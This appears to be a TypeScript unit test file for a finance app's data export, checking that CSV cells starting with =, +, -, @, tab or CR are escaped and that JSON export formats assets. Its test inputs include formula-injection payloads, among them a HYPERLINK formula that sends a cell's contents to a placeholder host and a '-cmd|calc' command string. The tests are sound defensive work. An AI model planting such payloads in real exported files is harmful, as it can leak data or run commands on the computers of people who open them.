import type { Asset } from '@/data/assets';
import type { Account, Transaction } from '@/data/types';
import { buildExport, csvCell } from '@/features/settings/exportData';

const acc: Account = { id: 'a1', bank: 'bca', name: 'BCA', type: 'tabungan', currency: 'IDR', openingBalance: 0 };
const tx = (merchant: string, extra: Partial<Transaction> = {}): Transaction => ({
  id: merchant, type: 'expense', merchant, categoryKey: 'food', accountId: 'a1', date: '2026-11-07', time: '10:00',
  amount: 45_000, currency: 'IDR', source: 'smartlog', ...extra,
});

describe('export CSV (audit 13)', () => {
  it('teks berawalan = + - @ tab CR tidak bisa berjalan sebagai formula', () => {
    expect(csvCell('=HYPERLINK("http://x/?"&B2,"klik")')).toBe('"\'=HYPERLINK(""http://x/?""&B2,""klik"")"');
    expect(csvCell('+62811')).toBe("'+62811");
    expect(csvCell('-cmd|calc')).toBe("'-cmd|calc");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\t=1')).toBe("'\t=1");
    expect(csvCell('\r=1')).toBe('"\'\r=1"');
  });

  it('teks biasa dan angka (termasuk negatif) tidak diubah', () => {
    expect(csvCell('Indomaret')).toBe('Indomaret');
    expect(csvCell('-12.50')).toBe('-12.50');
    expect(csvCell('45000')).toBe('45000');
    expect(csvCell('Kopi, roti')).toBe('"Kopi, roti"');
  });

  it('buildExport: merchant dan catatan berbahaya ditetralkan, nominal tetap angka', () => {
    const csv = buildExport('CSV', [acc], [tx('=1+1', { note: '@evil' }), tx('Warung')]);
    const [head, bad, ok] = csv.split('\n');
    expect(head).toBe('date,time,type,merchant,category,account,to_account,amount,currency,source,note');
    expect(bad).toBe("2026-11-07,10:00,expense,'=1+1,food,BCA,,45000,IDR,smartlog,'@evil");
    expect(ok).toBe('2026-11-07,10:00,expense,Warung,food,BCA,,45000,IDR,smartlog,');
  });

  it('buildExport JSON menyertakan daftar assets dengan buyPrice & valueOverride terformat desimal', () => {
    const assets: Asset[] = [
      { id: 'as1', type: 'stock_us', symbol: 'AAPL', name: 'Apple', quantity: 2, buyPrice: 19550, currency: 'USD', priceKey: 'US:AAPL', createdAt: '2026-11-01T00:00:00Z' },
      { id: 'as2', type: 'property', name: 'Rumah', currency: 'IDR', valueOverride: 900_000_000, createdAt: '2026-11-01T00:00:00Z' },
    ];
    const parsed = JSON.parse(buildExport('JSON', [acc], [tx('Warung')], assets));
    expect(parsed.assets).toHaveLength(2);
    expect(parsed.assets[0]).toMatchObject({ id: 'as1', symbol: 'AAPL', buyPrice: '195.50' });
    expect(parsed.assets[0].valueOverride).toBeUndefined();
    expect(parsed.assets[1]).toMatchObject({ id: 'as2', name: 'Rumah', valueOverride: '900000000' });
    expect(parsed.assets[1].buyPrice).toBeUndefined();
  });
});
